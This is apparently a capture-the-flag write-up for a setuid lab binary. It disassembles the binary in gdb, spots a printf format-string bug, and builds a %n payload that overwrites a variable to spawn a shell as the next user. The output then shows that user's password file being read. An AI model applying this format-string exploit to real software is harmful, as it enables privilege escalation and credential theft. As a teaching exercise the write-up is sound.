```shell
$> ls -la
[...]
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
[...]

$> ./level3
input:  test
output: test

# program asks for input and shows it back
```

```shell
$> gdb level3
(gdb) disas main
    [...]
    0x08048520 <+6>:     call   0x80484a4 <v>
    [...]

# it call function v()

(gdb) set disassembly-flavor intel
(gdb) disas v
    [...]
    0x080484ad <+9>:     mov    eax,ds:0x8049860            #1
    [...]
    0x080484be <+26>:    lea    eax,[ebp-0x208]             #2
    0x080484c4 <+32>:    mov    DWORD PTR [esp],eax
    0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>       
    0x080484cc <+40>:    lea    eax,[ebp-0x208]             #3
    0x080484d2 <+46>:    mov    DWORD PTR [esp],eax
    0x080484d5 <+49>:    call   0x8048390 <printf@plt>
    0x080484da <+54>:    mov    eax,ds:0x804988c            #4
    0x080484df <+59>:    cmp    eax,0x40                    
    0x080484e2 <+62>:    jne    0x8048518 <v+116>
    [...]
    0x080484eb <+71>:    mov    eax,0x8048600               #5
        [...]
    0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
    0x0804850c <+104>:   mov    DWORD PTR [esp],0x804860d
    0x08048513 <+111>:   call   0x80483c0 <system@plt>
    [...]

#1: the buffer.
#2: program calls fgets() that's secured from buffer overflow, and set input value to the buffer.
#3: program calls printf() and prints the buffer.
#4: compare the value of variable 'm' (#3.1) with 0x40. if it's not 0x40, it will return.
#5: if it's 0x40, it will print "Wait what?!\n" (#4.1) with fwrite and call system("/bin/sh" (#4.2)) .

#3.1:
(gdb) x /s 0x804988c
0x804988c <m>:   ""

#4.1:
(gdb) x /s 0x8048600
0x8048600:       "Wait what?!\n"

#4.2:
(gdb) x /s 0x804860d
0x804860d:       "/bin/sh"
```

We know to get shell we need to change m value to 0x40.
We can't use overflow vulnerability to get shell because here uses fgets().
But we can use printf() vulnerability.

```shell
$> ./level3
input:  aaaa %p %p %p %p %p %p                                               #1
output: aaaa 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161 0x20702520 0x25207025   #2

# printf() vulnerability: Use of Externally-Controlled Format String (CWE-134).
#1: try to know the offset value.
#2: the offset value is at the 4th position (0x61616161).

$> python -c "print '\x8c\x98\x04\x08' + '\x90' * 60 + '%4\$n'" > /tmp/exploit

# '\x8c\x98\x04\x08': address of m
# '\x90' * 60: padding (because we need 64 bytes and address of 'm' has 4 bytes)
# %n: format of printf(), add lenght of previous string to the offset.
# $4: fix to the 4th argument (offset) of printf()

$> cat /tmp/exploit - | ./level3 
�������������������������������������������������������������
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```